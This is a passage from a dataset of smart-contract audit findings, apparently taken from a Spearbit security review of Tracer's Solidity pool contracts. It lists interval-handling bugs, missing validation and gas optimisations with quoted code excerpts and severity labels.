commits. It is also important that lastPriceTimestamp is only updated after the last executeCommitments(), otherwise it will revert. 17 function executeCommitments(bool boundedIntervals, uint256 numberOfIntervals) external override ,! onlyPool { ... uint256 upperBound = boundedIntervals ? numberOfIntervals : type(uint256).max; ... while (i < upperBound) { if (block.timestamp >= lastPriceTimestamp + updateInterval * counter) { // ,! lastPriceTimestamp shouldn't be updated too soon ... } } ... updateMintingFee(); // should do this once (in combination with _boundedIntervals==true) ... }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "It is not possible to call executeCommitments() for multiple old commits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Assuming the pool has not been updated for many update intervals, performUpkeepSinglePool() can call poolUpkeep() repeatedly with _boundedIntervals == true and a bounded amount of gas to fix this situation. In this context the following problem occurs:  In the first run of poolUpkeep(), lastPriceTimestamp will be set to block.timestamp.  In the next run of poolUpkeep(), processing will stop at require(intervalPassed(),..), because block.timestamp hasnt increased. This means the rest of the commitments wont be executed by executeCommitments() and updateIntervalId, which is updated in executeCommitments(), will start lagging. 18 function poolUpkeep(..., bool _boundedIntervals, uint256 _numberOfIntervals) external override ,! onlyKeeper { require(intervalPassed(), \"Update interval hasn't passed\"); // next time lastPriceTimestamp == ,! block.timestamp executePriceChange(_oldPrice, _newPrice); // should only to this once (in combination with ,! _boundedIntervals==true) IPoolCommitter(poolCommitter).executeCommitments(_boundedIntervals, _numberOfIntervals); lastPriceTimestamp = block.timestamp; // shouldn't update until all executeCommitments() are ,! processed } function intervalPassed() public view override returns (bool) { unchecked { return block.timestamp >= lastPriceTimestamp + updateInterval; } } }", "labels": ["Spearbit", "Tracer", "Severity: Medium Risk"]}, {"title": "Incorrect comparison in getUpdatedAggregateBalance()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "When the value of data.updateIntervalId accidentally happens to be larger data.currentUpdateIntervalId in the getUpdatedAggregateBalance() function, it will execute the rest of the function, which shouldnt happen. Although this is unlikely it is also very easy to prevent. function getUpdatedAggregateBalance(UpdateData calldata data) external pure returns (...) { if (data.updateIntervalId == data.currentUpdateIntervalId) { // Update interval has not passed: No change return (0, 0, 0, 0, 0); } }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "updateAggregateBalance() can run out of gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The updateAggregateBalance() function of the PoolCommitter contract contains a for loop that, in theory, could use up all the gas and result in a revert. The updateAggregateBalance() function checks all future intervals every time it is called and adds them back to the unAggregatedCommitments array, which is checked in the next function call. This would only be a problem if frontRunningInterval is much larger than updateInterval, a situation that seems unlikely in practice. function updateAggregateBalance(address user) public override checkInvariantsAfterFunction { ... uint256[] memory currentIntervalIds = unAggregatedCommitments[user]; uint256 unAggregatedLength = currentIntervalIds.length; for (uint256 i = 0; i < unAggregatedLength; i++) { uint256 id = currentIntervalIds[i]; ... UserCommitment memory commitment = userCommitments[user][id]; ... if (commitment.updateIntervalId < updateIntervalId) { ... } else { ... storageArrayPlaceHolder.push(currentIntervalIds[i]); // entry for future intervals stays ,! in array } } delete unAggregatedCommitments[user]; unAggregatedCommitments[user] = storageArrayPlaceHolder; ... }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Pool information might be lost if setFactory() of PoolKeeper contract is called", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The PoolKeeper contract has a function to change the factory: setFactory(). However, calling this function will make previous pools inaccessible for this PoolKeeper unless the new factory imports the pools from the old factory. The isUpkeepRequiredSinglePool() function calls factory.isValidPool(_pool), and it will fail because the new factory doesnt know about the old pools. As this call is essential for upkeeping, the entire upkeep mechanism will fail. function setFactory(address _factory) external override onlyOwner { factory = IPoolFactory(_factory); ... } function isUpkeepRequiredSinglePool(address _pool) public view override returns (bool) { if (!factory.isValidPool(_pool)) { // might not work if factory is changed return false; } ... }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Ether could be lost when calling commit()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The commit() function sends the supplied ETH to makePaidClaimRequest() only if payForClaim == true. If the caller of commit() accidentally sends ETH when payForClaim == false then the ETH stays in the PoolCommitter contract and is effectively lost. Note: This was also documented in Secureums CARE Tracking function commit(...) external payable override checkInvariantsAfterFunction { ... if (payForClaim) { autoClaim.makePaidClaimRequest{value: msg.value}(msg.sender); } }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Race condition if PoolFactory deploy pools before fees are set", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The deployPool function of PoolFactory contract can deploy pools before the changeInterval value and minting and burning fees are set. This means that fees would not be subtracted. The exact boundaries for the mintingFee, burningFee and changeInterval values arent clear. In some parts of the code < 1e18 is used, and in other parts <= 1e18. Furthermore, the initialize() function of the PoolCommitter contract doesnt check the value of changeInter- val. The setBurningFee(), setMintingFee() and setChangeInterval() functions of PoolCommitter contract dont check the new values. Finally, two representations of 1e18 are used: 1e18 and PoolSwapLibrary.WAD_PRECISION. contract PoolFactory is IPoolFactory, Ownable { function setMintAndBurnFeeAndChangeInterval(uint256 _mintingFee, uint256 _burningFee,...) ... { ... require(_mintingFee <= 1e18, \"Fee cannot be > 100%\"); require(_burningFee <= 1e18, \"Fee cannot be > 100%\"); require(_changeInterval <= 1e18, \"Change interval cannot be > 100%\"); mintingFee = _mintingFee; burningFee = _burningFee; changeInterval = _changeInterval; ... } function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ,! ... // no check that mintingFee, burningFee, changeInterval are set poolCommitter.initialize(..., mintingFee, burningFee, changeInterval, ...); } } 22 contract PoolCommitter is IPoolCommitter, Initializable { function initialize(... ,uint256 _mintingFee, uint256 _burningFee,... ) ... { ... require(_mintingFee < PoolSwapLibrary.WAD_PRECISION, \"Minting fee >= 100%\"); require(_burningFee < PoolSwapLibrary.WAD_PRECISION, \"Burning fee >= 100%\"); ... // no check on _changeInterval mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee); burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee); changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval); ... } function setBurningFee(uint256 _burningFee) external override onlyGov { burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee); // no check on _burningFee ... } function setMintingFee(uint256 _mintingFee) external override onlyGov { mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee); // no check on _mintingFee ... } function setChangeInterval(uint256 _changeInterval) external override onlyGov { changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval); // no check on ,! _changeInterval ... } function updateMintingFee(bytes16 longTokenPrice, bytes16 shortTokenPrice) private { ... if (PoolSwapLibrary.compareDecimals(mintingFee, MAX_MINTING_FEE) == 1) { // mintingFee is greater than 1 (100%). // We want to cap this at a theoretical max of 100% mintingFee = MAX_MINTING_FEE; // so mintingFee is allowed to be 1e18 } } }", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Committer not validated on withdraw claim and multi-paid claim", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "AutoClaim checks that the committer creating the claim request in makePaidClaimRequest and withdrawing the claim request in withdrawUserClaimRequest is a valid committer for the PoolFactory used in theAutoClaim initializer. The same security check should be done in all the other functions where the committer is passed as a function parameter.", "labels": ["Spearbit", "Tracer", "Severity: Low Risk"]}, {"title": "Some SMAOracle and AutoClaim state variables can be declared as immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "In the SMAOracle contract, the oracle, periods, observer, scaler and updateInterval state vari- ables are not declared as immutable. In the AutoClaim contract, the poolFactory state variable is not declared as immutable. Since the mentioned variables are only initialized in the contracts constructors, they can be declared as immutable in order to save gas.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Use of counters can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "counter and i are both used as counters for the same loop. uint32 counter = 1; uint256 i = 0; ... while (i < upperBound) { ... unchecked { counter += 1; } i++; }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "transferOwnership() function is inaccessible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The ERC20_Cloneable contract contains a transferOwnership() function that may only be called by the owner, which is PoolFactory. However PoolFactory doesnt call the function so it is essentially dead code, making the deployment cost unnecessary additional gas. function transferOwnership(address _owner) external onlyOwner { require(_owner != address(0), \"Owner: setting to 0 address\"); owner = _owner; }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Use cached values when present", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The updateAggregateBalance() function creates a temporary variable id with the value currentIn- Immediately after that, currentIntervalIds[i] is used again. This could be replaced by id to tervalIds[i]. save gas. function updateAggregateBalance(address user) public override checkInvariantsAfterFunction { ... for (uint256 i = 0; i < unAggregatedLength; i++) { uint256 id = currentIntervalIds[i]; if (currentIntervalIds[i] == 0) { // could use id continue; }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "_invariantCheckContract stored twice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Both the PoolCommitter and LeveragedPool contracts store the value of _invariantCheckContract twice, both in invariantCheckContract and invariantCheck. This is not necessary and costs extra gas. contract PoolCommitter is IPoolCommitter, Initializable { ... address public invariantCheckContract; IInvariantCheck public invariantCheck; ... function initialize( ..., address _invariantCheckContract, ... ) external override initializer { ... invariantCheckContract = _invariantCheckContract; invariantCheck = IInvariantCheck(_invariantCheckContract); ... } } contract LeveragedPool is ILeveragedPool, Initializable, IPausable { ... address public invariantCheckContract; IInvariantCheck public invariantCheck; ... function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! ... invariantCheckContract = initialization._invariantCheckContract; invariantCheck = IInvariantCheck(initialization._invariantCheckContract); } }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary if/else statement in LeveragedPool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "A boolean variable is used to indicate the type of token to mint. The if/else statement can be avoided by using LONG_INDEX or SHORT_INDEX as the parameter instead of a bool to indicate the use of long or short token. uint256 public constant LONG_INDEX = 0; uint256 public constant SHORT_INDEX = 1; ... function mintTokens(bool isLongToken,...){ if (isLongToken) { IPoolToken(tokens[LONG_INDEX]).mint(...); } else { IPoolToken(tokens[SHORT_INDEX]).mint(...); ...", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Uncached array length used in loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The users array length is used in a for loop condition, therefore the length of the array is evaluated in every loop iteration. Evaluating it once and caching it can save gas. for (uint256 i; i < users.length; i++) { ... }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary deletion of array elements in a loop is expensive", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The unAggregatedCommitments[user] array is deleted after the for loop in updateAggregateBal- ance. Therefore, deleting the array elements one by one with delete unAggregatedCommitments[user][i]; in the loop body costs unnecessary gas.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Zero-value transfers are allowed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Given that claim() can return 0 when the claim isnt valid yet due to updateInterval, the return value should be checked to avoid doing an unnecessary sendValue() call with amount 0. Address.sendValue( payable(msg.sender), claim(user, poolCommitterAddress, poolCommitter, currentUpdateIntervalId) );", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unneeded onlyUnpaused modifier in setQuoteAndPool()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The setQuoteAndPool() function is only callable once, from the factory contract during deployment, due to the onlyFactory modifier. During this call, the contract is always unpaused, therefore the onlyUnpaused modifier is not necessary.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary mapping access in AutoClaim.makePaidClaimRequest()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Resolving mappings consumes more gas than directly accessing the storage struct, therefore its more gas-efficient to use the already de-referenced variable than to resolve the mapping again. function makePaidClaimRequest(address user) external payable override onlyPoolCommitter { ClaimRequest storage request = claimRequests[user][msg.sender]; ... uint256 reward = claimRequests[user][msg.sender].reward; ... claimRequests[user][msg.sender].updateIntervalId = requestUpdateIntervalId; claimRequests[user][msg.sender].reward = msg.value;", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Function complexity can be reduced from linear to constant by rewriting loops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The add() function of the PriceObserver contract shifts an entire array if the buffer is full, and the SMA() function of the SMAOracle contract sums the values of an array to calculate its average. Both of these functions have O(n) complexity and could be rewritten to have O(1) complexity. This would save gas and possibly increase the buffer size. 31 contract PriceObserver is Ownable, IPriceObserver { ... * @dev If the backing array is full (i.e., `length() == capacity()`, then * it is rotated such that the oldest price observation is deleted function add(int256 x) external override onlyWriter returns (bool) { ... if (full()) { leftRotateWithPad(x); ... } function leftRotateWithPad(int256 x) private { uint256 n = length(); /* linear scan over the [1, n] subsequence */ for (uint256 i = 1; i < n; i++) { observations[i - 1] = observations[i]; } ... } contract SMAOracle is IOracleWrapper { * @dev O(k) complexity due to linear traversal of the final `k` elements of `xs` ... function SMA(int256[24] memory xs, uint256 n, uint256 k) public pure returns (int256) { ... /* linear scan over the [n - k, n] subsequence */ for (uint256 i = n - k; i < n; i++) { S += xs[i]; } ... } }", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unused observer state variable in PoolKeeper", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "There is no use for the observer state variable. It is only used in performUpkeepSinglePool in a require statement to check if is set. address public observer; function setPriceObserver(address _observer) external onlyOwner { ... observer = _observer; ... function performUpkeepSinglePool(...) require(observer != address(0), \"Observer not initialized\"); ...", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Usage of temporary variable instead of type casting in PoolKeeper.performUpkeepSinglePool()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The pool temporary variable is used to cast the address to ILeveragedPool. Casting the address directly where the pool variable is used saves gas, as _pool is calldata.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Events and event emissions can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "PoolFactory.deployPool() would result in: Having a single DeployCommitter event to be emitted after setQuoteAndPool() in 1. Having better UX/event tracking and alignment with the current behavior to emit events during the Factory deployment. 2. Removing the QuoteAndPoolChanged event that is emitted only once during the lifetime of the PoolCommitter during PoolFactory.deployPool(). 3. Removing the ChangeIntervalSet emission in PoolCommitter.initialize(). The changeInterval has not really changed, it was initialized. This can be tracked by the DeployCommitter event.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Multi-paid claim rewards should be sent only if nonzero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "In both multiPaidClaimMultiplePoolCommitters() and multiPaidClaimSinglePoolCommitter(), there could be cases where the reward sent back to the claimer is zero. In these scenarios, the reward value should be checked to avoid wasting gas.", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Unnecessary quad arithmetic use where integer arithmetic works", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The ABDKMathQuad library is used to compute a division which is then truncated with toUint(). Semantically this is equivalent to a standard uint division, which is more gas efficient. The same library is also unnecessarily used to compute keepers reward. This can be safely done by using standard uint computation. function appropriateUpdateIntervalId(...) ... uint256 factorDifference = ABDKMathQuad.toUInt(divUInt(frontRunningInterval, updateInterval)); function keeperReward(...) ... int256 wadRewardValue = ABDKMathQuad.toInt( ABDKMathQuad.add( ABDKMathQuad.fromUInt(_keeperGas), ABDKMathQuad.div( ( ABDKMathQuad.div( (ABDKMathQuad.mul(ABDKMathQuad.fromUInt(_keeperGas), _tipPercent)), ABDKMathQuad.fromUInt(100) ) ), FIXED_POINT ) ) ); uint256 decimals = IERC20DecimalsWrapper(ILeveragedPool(_pool).quoteToken()).decimals(); uint256 deWadifiedReward = PoolSwapLibrary.fromWad(uint256(wadRewardValue), decimals);", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Custom errors should be used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "In the latest Solidity versions it is possible to replace the strings used to encode error messages with custom errors, which are more gas efficient. AutoClaim.sol: PoolCommitter\"); ,! AutoClaim.sol: AutoClaim.sol: PoolCommitter\"); ,! AutoClaim.sol: require(poolFactory.isValidPoolCommitter(msg.sender), \"msg.sender not valid require(_poolFactoryAddress != address(0), \"PoolFactory address == 0\"); require(poolFactory.isValidPoolCommitter(poolCommitterAddress), \"Invalid require(users.length == poolCommitterAddresses.length, \"Supplied arrays must be same length\"); ,! ChainlinkOracleWrapper.sol: require(_oracle != address(0), \"Oracle cannot be 0 address\"); ChainlinkOracleWrapper.sol: require(_deployer != address(0), \"Deployer cannot be 0 address\"); ChainlinkOracleWrapper.sol: require(_decimals <= MAX_DECIMALS, \"COA: too many decimals\"); ChainlinkOracleWrapper.sol: require(answeredInRound >= roundID, \"COA: Stale answer\"); ChainlinkOracleWrapper.sol: require(timeStamp != 0, \"COA: Round incomplete\"); ERC20_Cloneable.sol: ERC20_Cloneable.sol: InvariantCheck.sol: InvariantCheck.sol: LeveragedPool.sol: require(msg.sender == owner, \"msg.sender not owner\"); require(_owner != address(0), \"Owner: setting to 0 address\"); require(_factory != address(0), \"Factory address cannot be null\"); require(poolFactory.isValidPool(poolToCheck), \"Pool is invalid\"); require(!paused, \"Pool is paused\"); 36 LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(msg.sender == keeper, \"msg.sender not keeper\"); require(msg.sender == invariantCheckContract, \"msg.sender not invariantCheckContract\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: address\"); ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: be 0 address\"); ,! LeveragedPool.sol: cannot be 0 address\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: address\"); ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: be 0 address\"); ,! LeveragedPool.sol: require(msg.sender == poolCommitter, \"msg.sender not poolCommitter\"); require(msg.sender == governance, \"msg.sender not governance\"); require(initialization._feeAddress != address(0), \"Fee address cannot be 0 require(initialization._quoteToken != address(0), \"Quote token cannot be 0 require(initialization._oracleWrapper != address(0), \"Oracle wrapper cannot require(initialization._settlementEthOracle != address(0), \"Keeper oracle require(initialization._owner != address(0), \"Owner cannot be 0 address\"); require(initialization._keeper != address(0), \"Keeper cannot be 0 address\"); require(initialization._longToken != address(0), \"Long token cannot be 0 require(initialization._shortToken != address(0), \"Short token cannot be 0 require(initialization._poolCommitter != address(0), \"PoolCommitter cannot require(initialization._invariantCheckContract != address(0), \"InvariantCheck cannot be 0 address\"); require(initialization._fee < PoolSwapLibrary.WAD_PRECISION, \"Fee >= 100%\"); require(initialization._secondaryFeeSplitPercent <= 100, \"Secondary fee split cannot exceed 100%\"); as old governance address\"); ,! LeveragedPool.sol: LeveragedPool.sol: ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: ,! LeveragedPool.sol: address\"); ,! LeveragedPool.sol: LeveragedPool.sol: LeveragedPool.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: ,! PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: ,! PoolCommitter.sol: PoolCommitter.sol: invariantCheckContract\"); require(initialization._updateInterval != 0, \"Update interval cannot be 0\"); require(intervalPassed(), \"Update interval hasn't passed\"); require(account != address(0), \"Account cannot be 0 address\"); require(msg.sender == _oldSecondaryFeeAddress); require(_keeper != address(0), \"Keeper address cannot be 0 address\"); require(_governance != governance, \"New governance address cannot be same require(_governance != address(0), \"Governance address cannot be 0 require(governanceTransferInProgress, \"No governance change active\"); require(msg.sender == _provisionalGovernance, \"Not provisional governor\"); require(paused, \"Pool is live\"); require(!paused, \"Pool is paused\"); require(msg.sender == governance, \"msg.sender not governance\"); require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(!paused, \"Pool is paused\"); require(msg.sender == invariantCheckContract, \"msg.sender not require(msg.sender == factory, \"Committer: not factory\"); require(msg.sender == leveragedPool, \"msg.sender not leveragedPool\"); require(msg.sender == user || msg.sender == address(autoClaim), \"msg.sender not committer or AutoClaim\"); require(_factory != address(0), \"Factory address cannot be 0 address\"); require(_invariantCheckContract != address(0), \"InvariantCheck address cannot be 0 address\"); ,! PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: PoolCommitter.sol: require(_autoClaim != address(0), \"AutoClaim address cannot be null\"); require(_mintingFee < PoolSwapLibrary.WAD_PRECISION, \"Minting fee >= 100%\"); require(_burningFee < PoolSwapLibrary.WAD_PRECISION, \"Burning fee >= 100%\"); require(userCommit.balanceLongBurnAmount <= balance.longTokens, \"Insufficient pool tokens\"); ,! PoolCommitter.sol: require(userCommit.balanceShortBurnAmount <= balance.shortTokens, ,! \"Insufficient pool tokens\"); 37 ,! PoolCommitter.sol: PoolCommitter.sol: address\"); ,! PoolCommitter.sol: address\"); ,! PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: ,! PoolFactory.sol: ,! PoolFactory.sol: ,! PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolFactory.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolKeeper.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PoolSwapLibrary.sol: PriceObserver.sol: PriceObserver.sol: PriceObserver.sol: SMAOracle.sol: ,! SMAOracle.sol: PoolCommitter.sol: require(userCommit.balanceLongBurnMintAmount <= balance.longTokens, \"Insufficient pool tokens\"); ,! PoolCommitter.sol: require(userCommit.balanceShortBurnMintAmount <= balance.shortTokens, \"Insufficient pool tokens\"); require(amount > 0, \"Amount must not be zero\"); require(_quoteToken != address(0), \"Quote token address cannot be 0 require(_leveragedPool != address(0), \"Leveraged pool address cannot be 0 require(_feeReceiver != address(0), \"Address cannot be null\"); require(_poolKeeper != address(0), \"PoolKeeper not set\"); require(autoClaim != address(0), \"AutoClaim not set\"); require(invariantCheck != address(0), \"InvariantCheck not set\"); require(IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender,\"Deployer must be oracle wrapper owner\"); require(deploymentParameters.leverageAmount >= 1 && deploymentParameters.leverageAmount <= maxLeverage,\"PoolKeeper: leveraged amount invalid\"); require(IERC20DecimalsWrapper(deploymentParameters.quoteToken).decimals() <= MAX_DECIMALS,\"Decimal precision too high\"); require(_poolKeeper != address(0), \"address cannot be null\"); require(_invariantCheck != address(0), \"address cannot be null\"); require(_autoClaim != address(0), \"address cannot be null\"); require(newMaxLeverage > 0, \"Maximum leverage must be non-zero\"); require(_feeReceiver != address(0), \"address cannot be null\"); require(newFeePercent <= 100, \"Secondary fee split cannot exceed 100%\"); require(_fee <= 0.1e18, \"Fee cannot be > 10%\"); require(_mintingFee <= 1e18, \"Fee cannot be > 100%\"); require(_burningFee <= 1e18, \"Fee cannot be > 100%\"); require(_changeInterval <= 1e18, \"Change interval cannot be > 100%\"); require(msg.sender == address(factory), \"Caller not factory\"); require(_factory != address(0), \"Factory cannot be 0 address\"); require(_observer != address(0), \"Price observer cannot be 0 address\"); require(firstPrice > 0, \"First price is non-positive\"); require(observer != address(0), \"Observer not initialized\"); require(timestamp >= lastPriceTimestamp, \"timestamp in the past\"); require(price != 0, \"price == 0\"); require(price != 0, \"price == 0\"); require(price != 0, \"price == 0\"); require(msg.sender == writer, \"PO: Permission denied\"); require(i < length(), \"PO: Out of bounds\"); require(_writer != address(0), \"PO: Null address not allowed\"); require(_spotOracle != address(0) && _observer != address(0) && _deployer require(_periods > 0 && _periods <= IPriceObserver(_observer).capacity(), require(_spotDecimals <= MAX_DECIMALS, \"SMA: Decimal precision too high\"); require(_updateInterval != 0, \"Update interval cannot be 0\"); require(block.timestamp >= lastUpdate + updateInterval, \"SMA: Too early to require(k > 0 && k <= n && k <= uint256(type(int256).max), \"SMA: Out of != address(0),\"SMA: Null address forbidden\"); \"SMA: Out of bounds\"); ,! SMAOracle.sol: SMAOracle.sol: SMAOracle.sol: update\"); ,! SMAOracle.sol: ,! bounds\");", "labels": ["Spearbit", "Tracer", "Severity: Gas Optimization"]}, {"title": "Different updateIntervals in SMAOracle and pools", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The updateIntervals for the pools and the SMAOracles are different. If the updateInterval for SMAOracle is larger than the updateInterval for poolUpkeep(), then the oracle price update could happen directly after the poolUpkeep(). It is possible to perform permissionless calls to poll(). In combination with a delayed poolUpkeep() an attacker could manipulate the timing of the SMAOracle price, because after a call to poll() it cant be called again until updateInterval has passed. contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function initialize(ILeveragedPool.Initialization calldata initialization) external override initializer { ,! ... updateInterval = initialization._updateInterval; ... } function poolUpkeep(... ) external override onlyKeeper { require(intervalPassed(), \"Update interval hasn't passed\"); ... } function intervalPassed() public view override returns (bool) { unchecked { return block.timestamp >= lastPriceTimestamp + updateInterval; } } contract SMAOracle is IOracleWrapper { constructor(..., uint256 _updateInterval, ... ) { updateInterval = _updateInterval; } function poll() external override returns (int256) { require(block.timestamp >= lastUpdate + updateInterval, \"SMA: Too early to update\"); return update(); } }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Tight coupling between LeveragedPool and PoolCommitter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The LeveragedPool and PoolCommitter contracts call each other back and forth. This could be optimized to make the code clearer and perhaps save some gas. Here is an example: contract LeveragedPool is ILeveragedPool, Initializable, IPausable { function poolUpkeep(...) external override onlyKeeper { ... IPoolCommitter(poolCommitter).executeCommitments(_boundedIntervals, _numberOfIntervals); ... } } contract PoolCommitter is IPoolCommitter, Initializable { function executeCommitments(...) external override onlyPool { ... uint256 lastPriceTimestamp = pool.lastPriceTimestamp(); uint256 updateInterval = pool.updateInterval(); ... } } // call to first contract // call to first contract", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Code in SMA() is hard to read", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The SMA() function checks for k being smaller or equal to uint256(type(int256).max), a value somewhat difficult to read. Additionally, the number 24 is hardcoded. Note: This issue was also mentioned in Runtime Verification report: B15 PriceObserver - avoid magic values function SMA( int256[24] memory xs, uint256 n, uint256 k) public pure returns (int256) { ... require(k > 0 && k <= n && k <= uint256(type(int256).max), \"SMA: Out of bounds\"); ... for (uint256 i = n - k; i < n; i++) { S += xs[i]; } ... }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Code is chain-dependant due to fixed block time and no support for EIP-1559", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "The PoolKeeper contract has several hardcoded assumptions about the chain on which it will be deployed. It has no support for EIP-1559 and doesnt use block.basefee. On Ethereum Mainnet the blocktime will change to 12 seconds with the ETH2 merge. The Secureum CARE-X report also has an entire discussion about other chains. contract PoolKeeper is IPoolKeeper, Ownable { ... uint256 public constant BLOCK_TIME = 13; /* in seconds */ ... /// Captures fixed gas overhead for performing upkeep that's unreachable /// by `gasleft()` due to our approach to error handling in that code uint256 public constant FIXED_GAS_OVERHEAD = 80195; ... }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "ABDKQuad-related constants defined outside PoolSwapLibrary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Some ABDKQuad-related constants are defined outside of the PoolSwapLibrary while others are shadowing the ones defined inside the library. As all ABDKQuad-related logic is contained in the library its less error prone to have any ABDKQuad-related 